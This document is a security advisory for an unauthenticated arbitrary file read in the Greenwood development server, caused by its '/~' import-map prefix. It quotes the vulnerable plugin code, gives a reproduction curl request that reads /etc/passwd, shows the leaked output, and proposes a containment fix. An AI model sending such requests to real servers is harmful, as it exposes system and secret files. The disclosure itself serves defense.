# Arbitrary file read on the `greenwood develop` server via the `/~` import-map prefix

- **Severity:** High
- **Type:** Path traversal / arbitrary file disclosure (unauthenticated)
- **Threat model:** HTTP client → the development server (`greenwood develop`)
- **Affected version:** v0.34.0 (verified end-to-end)
- **Component:** `packages/cli/src/plugins/resource/plugin-node-modules.js`

## Summary

The node-modules resource plugin resolves any request whose path starts with the
import-map prefix `/~` by string-replacing the prefix with `file://` and reading the
resulting path off disk **with no restriction to `node_modules` or the project root, and
no file-extension gate**. An unauthenticated client can read any file the dev-server
process can access, including files outside the project.

## Root cause

`IMPORT_MAP_RESOLVED_PREFIX` is `"/~"` (`packages/cli/src/lib/walker-package-ranger.js:6`).

```js
// packages/cli/src/plugins/resource/plugin-node-modules.js:34-40
const fromImportMap = pathname.startsWith(IMPORT_MAP_RESOLVED_PREFIX);
const resolvedHref = fromImportMap
  ? pathname.replace(IMPORT_MAP_RESOLVED_PREFIX, "file://")   // "/~/etc/passwd" -> "file:///etc/passwd"
  : getResolvedHrefFromPathnameShortcut(pathname, projectDirectory);
...
return new Request(`${resolvedHref}${params}`);
```

```js
// plugin-node-modules.js:43-57 — no containment check, no extension gate
async shouldServe(url) {
  const { href, protocol } = url;
  return protocol === "file:" && (await checkResourceExists(new URL(href)));
}
async serve(url) {
  const body = await fs.readFile(url, "utf-8");
  return new Response(body, { headers: new Headers({ "Content-Type": this.contentType }) });
}
```

`/~` contains no dot-segments, so the WHATWG-URL normalization applied in
`lifecycles/serve.js:38` (which strips `..` / `%2e%2e`) does **not** remove it — the prefix
survives to `resolve()`. `plugin-user-workspace` explicitly defers on `/~` paths, so this
plugin owns them.

## Reproduction

Prereq: Node >= 22.18 (Greenwood requirement; ships a URLPattern polyfill).

```sh
# from a checkout of this branch
cd security-repro/dev-server-arbitrary-file-read
./repro.sh
```

`repro.sh` builds the local CLI, starts `greenwood develop` on the fixture, then issues:

```sh
curl --path-as-is 'http://localhost:1984/~/etc/passwd'
```

### Observed (v0.34.0)

```
HTTP/1.1 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Also works for absolute project paths, e.g. `GET /~/abs/path/to/project/secrets.json`
returns the file. No `..` and no supported extension are required.

### Expected

Requests under `/~` must resolve only to files inside known, resolved package roots
(node_modules); anything else should be `404`/`403`.

## Suggested fix

After computing `resolvedHref`, resolve it to a real path and assert it is contained
within an allow-list of package roots (e.g. `projectDirectory/node_modules` and the
resolved import-map roots) before serving. Do not derive a filesystem path from the raw
request prefix.
